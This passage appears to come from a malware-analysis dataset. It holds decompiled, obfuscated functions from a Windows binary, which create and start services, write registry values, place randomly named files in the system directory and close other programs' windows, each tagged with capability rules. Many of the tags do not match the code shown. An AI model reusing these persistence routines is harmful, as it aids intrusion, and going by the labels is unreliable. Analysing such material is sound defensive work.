        "token_count": 1865
    },
    "00404510": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404638) overlaps instruction at (ram,0x00404634)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __thiscall\nfcn.00404510(uint32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, int32_t param_7)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    uchar uVar3;\n    uint8_t uVar4;\n    code cVar6;\n    uint *puVar5;\n    ushort uVar7;\n    int32_t extraout_ECX;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    ushort unaff_BX;\n    uint *unaff_ESI;\n    int32_t *unaff_EDI;\n    uint *puVar10;\n    ushort in_SS;\n    uint8_t uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    char cVar13;\n    char cVar14;\n    unkbyte10 extraout_ST0;\n    ulong uVar15;\n    uint in_stack_ffffffa2;\n    uchar uVar16;\n    uchar auStack44 [32];\n    uint *puStack12;\n    uint32_t uStack8;\n    \n    bVar12 = *0x10 == 0x2c;\n    if ((SBORROW4(&stack0xfffffffc, 0x28)) || (!SBORROW4(&stack0xfffffffc, 0x28))) {\n        if (!bVar12) goto code_r0x00404532;\n    }\n    else {\n        bVar12 = (param_1 & *(param_1 + 0x87cb1757)) == 0;\n        param_1 = 0xf745d21;\ncode_r0x00404532:\n        uVar7 = param_1;\n        iVar8 = (param_1 >> 8 & 0xffff00) << 8;\n        param_1 = param_1 & 0xffff;\n        if (bVar12) {\n            unaff_EDI = CONCAT22(uVar7, in_SS);\n            unaff_BX = 0x47;\n            uVar3 = iVar8 >> 0x10;\n            uVar16 = iVar8 >> 0x18;\n            goto code_r0x00404544;\n        }\n    }\n    uVar3 = param_1;\n    uVar16 = param_1 >> 8;\ncode_r0x00404544:\n    arg_8h = CONCAT22(unaff_BX, CONCAT11(uVar16, uVar3));\n    puStack12 = fcn.00403a80(param_6, param_7, 0x4231f0, 7);\n    bVar12 = (POPCOUNT(puStack12 & 0xff) & 1U) == 0;\n    if (puStack12 == NULL) {\n        return 0;\n    }\n    if ((bVar12) || (!bVar12)) {\n        iVar8 = 7;\n        puVar5 = NULL;\n        unaff_EDI = auStack44 + 1;\n    }\n    else {\n        out(*unaff_ESI, 0);\n        puVar5 = puStack12;\n        do {\n            cVar6 = SUB41(puVar5 >> 8, 0);\n            in_AF = 9 < (puVar5 & 0xf) | in_AF;\n            puVar5 = CONCAT31(CONCAT21(puVar5 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == pe_dos_header);\n        *unaff_EDI = (*unaff_EDI + 0x7b) - in_AF;\n        *(extraout_ECX + -0x47) = puVar5;\n        *puVar5 = *puVar5 + -in_AF;\n        *arg_8h = *arg_8h;\n        iVar8 = extraout_ECX;\n    }\n    for (; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *unaff_EDI = puVar5;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *unaff_EDI = puVar5;\n    *(unaff_EDI + 2) = puVar5;\n    uStack8 = 0;\n    do {\n        uVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        auStack44[uStack8] = uVar3;\n        uStack8 = uStack8 + 1;\n    } while (uStack8 < 0x20);\n    puVar5 = auStack44;\n    puVar10 = puStack12;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar11 = 0;\n    cVar14 = SCARRY2(uStack8, 1);\n    cVar13 = uStack8 + 1 < 0;\n    uVar15 = fcn.00404940(param_2, param_3, param_4, param_5, auStack44, 0x20, puStack12);\n    puVar9 = uVar15 >> 0x20;\n    if ((cVar14 != cVar13) || (iVar8 = uVar15,  cVar14 == cVar13)) {\n        iVar8 = param_7;\n        in_stack_ffffffa2 = param_6;\n    }\n    *(iVar8 + -0x7ce92414) = extraout_ST0;\n    uVar4 = iVar8 - 1U;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    uVar4 = uVar4 + in_AF * '\\x06';\n    uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | uVar11 | in_AF * (0xf9 < uVar4)) * '`';\n    uVar2 = *puVar9;\n    *puVar9 = *puVar9 + 0x458bdf84;\n    uVar11 = uVar4 + 0x75;\n    pcVar1 = (iVar8 - 1U & 0xffffff00 | uVar11 - (0xba74207b < uVar2)) + 0x51;\n    *pcVar1 = (*pcVar1 - (uVar15 >> 0x20)) - (uVar4 < 0x8b || uVar11 < (0xba74207b < uVar2));\n    fcn.00403fd0(arg_8h, in_stack_ffffffa2);\n    return 1;\n}\n",
        "token_count": 1524
    },
    "00401f00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f00(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x423570);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x401e80, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 375
    },
    "00402420": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00402420(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pvData;\n    \n    pvData = NULL;\n    iVar2 = fcn.00404780(&pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (pvData == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x423374, 0x4233b4, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 234
    },
    "00403a80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403a80(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                pcVar4 = arg_10h + 1;\n                iVar1 = arg_14h;\n                pcVar3 = arg_8h;\n                do {\n                    pcVar3 = pcVar3 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 310
    },
    "00403fd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403fd0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    iVar3 = fcn.00401400(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x58) = arg_ch;\n        fcn.00401400(uVar1, uVar2, &arg_8h, &arg_ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 150
    },
    "00404040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404091) overlaps instruction at (ram,0x0040408f)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040404e)\n// WARNING: Removing unreachable block (ram,0x00404056)\n// WARNING: Removing unreachable block (ram,0x00404068)\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x004040c9\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404040(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uchar uVar2;\n    uchar uVar3;\n    char cVar4;\n    char cVar5;\n    char cStack14;\n    \n    if (arg_ch == 1) {\n        uVar1 = func_0x00402620();\n        cStack14 = uVar1 >> 8;\n        uVar1 = (uVar1 & 0xff | (cStack14 - unaff_EBX) + 0x4d << 8) & 0x26ae;\n        uVar2 = 0;\n        cVar5 = SBORROW2(uVar1, 1);\n        cVar4 = uVar1 - 1 < 0;\n        uVar3 = uVar1 == 1;\n        fcn.00404cb0();\n        if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n            *((&stack0xfffffff8 ^ *(unaff_EBX + -0x18)) - 4) = 0xffffffdf;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.00402000();\n        if ((!uVar2 && !uVar3) && (uVar2 || uVar3)) {\n            arg_ch = unaff_ESI;\n        }\n        if (*0x423658 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404220();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 554
    },
    "00404660": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00404660(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4232a0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x423664 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4232b0);\n    *0x423668 = (*pcVar1)(iVar2, 0x4232cc);\n    *0x42366c = (*pcVar1)(iVar2, 0x4232dc);\n    if (((*0x423664 != 0) && (*0x423668 != 0)) && (*0x42366c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 202
    },
    "00401800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401800(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00401920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040194b) overlaps instruction at (ram,0x00401949)\n// \n\nbool fcn.00401920(uint param_1)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uStack40;\n    uint auStack24 [4];\n    uint uStack8;\n    \n    uStack40 = param_1;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    if ((SCARRY4(&uStack40, 4) == &stack0xffffffdc < 0) && (SCARRY4(&uStack40, 4) != &stack0xffffffdc < 0)) {\n        in(extraout_DX);\n        LOCK();\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    auStack24[0] = 0x4235dc;\n    auStack24[1] = 0x4235d4;\n    auStack24[2] = 0x4235e4;\n    auStack24[3] = 0x4235ec;\n    uStack8 = 0x4235f4;\n    uVar3 = 0;\n    puVar2 = auStack24;\n    do {\n        uStack40 = *puVar2;\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    uStack40 = 0x4235cc;\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n    return iVar1 == 0;\n}\n",
        "token_count": 412
    },
    "004022d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004022d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    uint32_t var_4h;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    var_4h = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(var_4h + arg_8h) = iVar1 % 0x1a + 'a';\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "004024c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402509) overlaps instruction at (ram,0x00402504)\n// \n// WARNING: Variable defined which should be unmapped: var_314h\n\nbool __cdecl fcn.004024c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    uint8_t extraout_CL;\n    int32_t iVar2;\n    uint8_t in_DL;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    uint var_314h;\n    uint in_stack_fffffcec;\n    uint in_stack_fffffcf0;\n    uint in_stack_fffffcf4;\n    uint in_stack_fffffcf8;\n    uint in_stack_fffffcfc;\n    uint in_stack_fffffd00;\n    uint in_stack_fffffd04;\n    uint in_stack_fffffd08;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    cVar6 = '\\0';\n    cVar5 = '\\0';\n    bVar4 = (in_DL & 0x66) == 0;\n    iVar2 = fcn.004040e0(unaff_EDI, unaff_ESI, unaff_EBX, var_314h, in_stack_fffffcec, in_stack_fffffcf0, \n                         in_stack_fffffcf4, in_stack_fffffcf8, in_stack_fffffcfc, in_stack_fffffd00, in_stack_fffffd04, \n                         in_stack_fffffd08);\n    if ((!bVar4 && cVar6 == cVar5) && (bVar4 || cVar6 != cVar5)) {\n        *(iVar2 + -0x72c625aa) = *(iVar2 + -0x72c625aa) ^ extraout_CL;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403940();\n        arg_ch_01 = fcn.00403940();\n        arg_ch_02 = fcn.00403940();\n        fcn.004022d0(arg_10h, arg_ch_00);\n        fcn.004022d0(arg_8h, arg_ch_01);\n        fcn.004022d0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4231c0, &lpBuffer, arg_10h);\n        iVar2 = fcn.004013b0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4231cc, &lpBuffer, arg_8h);\n            iVar2 = fcn.004013b0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4231cc, &lpBuffer, arg_ch);\n                iVar2 = fcn.004013b0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004022d0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 1002
    },
    "00403270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403270(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00404160(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "00403540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403583) overlaps instruction at (ram,0x00403582)\n// \n// WARNING: Removing unreachable block (ram,0x0040355e)\n// WARNING: Removing unreachable block (ram,0x00403566)\n\nvoid __cdecl fcn.00403540(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint arg_ch_00;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uint arg_14h;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar4 = true;\n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar5 = fcn.00403430(&var_68h, &var_4h);\n    piVar1 = uVar5;\n    if ((bVar4) || (!bVar4)) {\n        arg_14h = 0x12000;\n        arg_ch_00 = var_4h;\n    }\n    else {\n        *(unaff_EBX + 0x68fc55) = *(unaff_EBX + 0x68fc55) | 0x20;\n        *piVar1 = *piVar1 + piVar1;\n        arg_ch_00 = uVar5 >> 0x20;\n        arg_14h = extraout_ECX;\n    }\n    fcn.00402390(&var_68h, arg_ch_00, 0x411194, arg_14h);\n    *arg_8h = 0x411194;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 485
    },
    "00403940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403940(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00403960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039cb) overlaps instruction at (ram,0x004039ca)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403a0e)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403960(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t uVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    bool bVar8;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar3 = arg_14h * 2;\n        do {\n            uVar2 = *(var_8h + arg_10h);\n            uVar4 = uVar3 & 0xffffff00 | uVar2;\n            uVar6 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n            bVar8 = SBORROW4(uVar6, 0x222c);\n            bVar7 = uVar6 - 0x222c < 0;\n            uVar1 = var_ch / arg_ch;\n            iVar5 = var_ch % arg_ch;\n            unaff_EBX = unaff_EBX & 0xffffff00 | *(iVar5 + arg_8h);\n            if ((uVar6 == 0x222c) || (uVar6 != 0x222c)) {\ncode_r0x004039e7:\n                if ((bVar8 != bVar7) || (bVar8 == bVar7)) {\n                    uVar1 = var_ch - 1;\n                    iVar5 = uVar1 >> 0x1f;\n                }\n                uVar2 = uVar2 ^ *(CONCAT44(uVar1, iVar5) % arg_ch + arg_8h);\n                uVar4 = uVar3 & 0xffffff00 | uVar2;\n                if ((-1 < uVar2) && (-1 >= uVar2)) {\n                    var_ch = var_ch + 4;\n                    *(arg_8h + 0x1c) = in_ST0;\n                    in_ST0 = in_ST1;\n                    in_ST1 = in_ST2;\n                    in_ST2 = in_ST3;\n                    in_ST3 = in_ST4;\n                    in_ST4 = in_ST5;\n                    in_ST5 = in_ST6;\n                    in_ST6 = in_ST7;\n                    goto code_r0x00403a2c;\n                }\n            }\n            else {\n                unaff_EBX = unaff_EBX + 1;\n                if (0x222b < uVar6 && unaff_EBX != 0) {\n                    in_AF = 9 < (uVar1 & 0xf) | in_AF;\n                    uVar1 = uVar1 & 0xffff0000 | CONCAT11((uVar1 >> 8) + in_AF, uVar1 + in_AF * '\\x06') & 0xff0f;\n                    *(uVar1 + 0x2a) = *(uVar1 + 0x2a) - unaff_EBX;\n                    bVar8 = SCARRY4(var_ch, 1);\n                    var_ch = var_ch + 1;\n                    bVar7 = var_ch < 0;\n                    goto code_r0x004039e7;\n                }\ncode_r0x00403a2c:\n                var_ch = var_ch + 1;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            uVar2 = var_10h ^ uVar4;\n            *(arg_18h + -1 + var_ch) = uVar2;\n            if (('\\0' < uVar2) && (uVar2 < '\\x01')) {\n                if ((uVar4 & 0xffffff00 | uVar2) == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(var_ch + arg_18h) = var_10h ^ unaff_EBX;\n            var_8h = var_8h + 1;\n            unaff_ESI = var_ch + 2;\n            uVar3 = arg_14h;\n            var_ch = unaff_ESI;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1147
    },
    "004040e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040ec) overlaps instruction at (ram,0x004040eb)\n// \n\nvoid __cdecl\nfcn.004040e0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint arg_34h)\n\n{\n    uint16_t uVar1;\n    char *in_EAX;\n    uint uVar3;\n    int32_t in_ECX;\n    ushort in_DX;\n    int32_t unaff_EBP;\n    uchar *unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_PF;\n    bool bVar4;\n    float10 in_ST0;\n    char *pcVar2;\n    \n    if ((in_PF) || (!in_PF)) {\n        bVar4 = *0x423660 != 0;\n        if (bVar4) {\n            return;\n        }\n        if ((!bVar4) || (bVar4)) goto code_r0x0040410d;\n        in_EAX = *0x4bb148d3;\n    }\n    *(in_ECX + 0x423660) = *(in_ECX + 0x423660) & 0xffffff85;\n    *(unaff_EBP + 0x34) = 0;\n    *in_EAX = *in_EAX + in_EAX;\n    unaff_ESI[-0x75] = unaff_ESI[-0x75] + (in_EAX >> 8);\n    uVar1 = in_EAX * unaff_ESI[-0x79];\n    pcVar2 = in_EAX & 0xffff0000 | uVar1;\n    *unaff_EDI = in_ST0;\n    *pcVar2 = *pcVar2 + uVar1;\n    pcVar2[0x4bb148d3] = pcVar2[0x4bb148d3] + (uVar1 >> 8);\n    out(*unaff_ESI, in_DX);\ncode_r0x0040410d:\n    uVar3 = (*_sym.imp.MSVCRT.dll_time)(0);\n    (*_sym.imp.MSVCRT.dll_srand)(uVar3);\n    *0x423660 = 1;\n    return;\n}\n",
        "token_count": 536
    },
    "00404160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404160(uint hSCManager, uint lpServiceName)\n\n{\n    uint uVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar **ppuVar6;\n    uchar **ppuVar7;\n    bool in_ZF;\n    uchar *apuStack24 [2];\n    \n    puVar5 = &stack0xfffffffc;\n    ppuVar7 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar7 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar6 = apuStack24 + 1;\n        ppuVar7 = apuStack24 + 1;\n        cVar2 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            ppuVar6 = ppuVar6 + -1;\n            *ppuVar6 = *puVar5;\n            cVar2 = cVar2 + -1;\n            apuStack24[1] = &stack0xfffffffc;\n        } while ('\\0' < cVar2);\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    *(ppuVar7 + 0xc) = iVar4;\n    if (iVar4 != 0) {\n        uVar1 = *(ppuVar7 + 0xc);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(uVar1, 0, 0);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n        if (((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0x420)) &&\n           (iVar4 = (*pcVar3)(),  iVar4 != 0x422)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n            return 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 466
    },
    "00404710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404710(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004047e9) overlaps instruction at (ram,0x004047e8)\n// \n// WARNING: Removing unreachable block (ram,0x0040482b)\n// WARNING: Removing unreachable block (ram,0x00404838)\n// WARNING: Removing unreachable block (ram,0x004047e9)\n\nuint fcn.00404780(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack800 [260];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(auStack540, &uStack16);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, auStack540, auStack280, &uStack8, auStack800, &uStack12, auStack20);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(auStack280, param_1);\n        if (iVar1 != 0) {\n            return 1;\n        